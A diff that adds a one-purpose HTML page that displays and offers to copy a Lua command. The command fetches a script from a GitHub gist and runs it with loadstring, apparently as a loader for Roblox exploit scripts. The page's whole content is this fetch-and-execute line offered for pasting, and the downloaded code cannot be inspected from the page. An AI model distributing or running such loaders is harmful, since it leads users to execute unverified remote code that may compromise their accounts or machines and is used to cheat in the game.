@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Centered Text with Copy Button</title>
+<style>
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-color: black;
+    font-family: Arial, sans-serif;
+  }
+  .container {
+    text-align: center;
+  }
+  #centered-text {
+    color: green;
+    font-size: 17px;
+    font-weight: bold;
+    padding: 20px;
+    border: 2px solid green;
+    border-radius: 10px;
+    margin-bottom: 20px;
+    display: inline-block;
+  }
+  .button {
+    background-color: green;
+    color: black;
+    border: none;
+    padding: 10px 20px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    cursor: pointer;
+    border-radius: 5px;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <div id="centered-text">
+    loadstring(game:HttpGet("https://gist.githubusercontent.com/NOTHINGx555/b5403ba82e46c2993ff072011bfa34aa/raw/f40764cbc182ec301f3a7121efdb7149870052b8/.lua", true))()
+  </div>
+  <br>
+  <button class="button" onclick="copyText()">Copy Text</button>
+</div>
+
+<script>
+  function copyText() {
+    var textToCopy = document.getElementById('centered-text').textContent;
+    navigator.clipboard.writeText(textToCopy);
+  }
+</script>
+
+</body>
+</html>
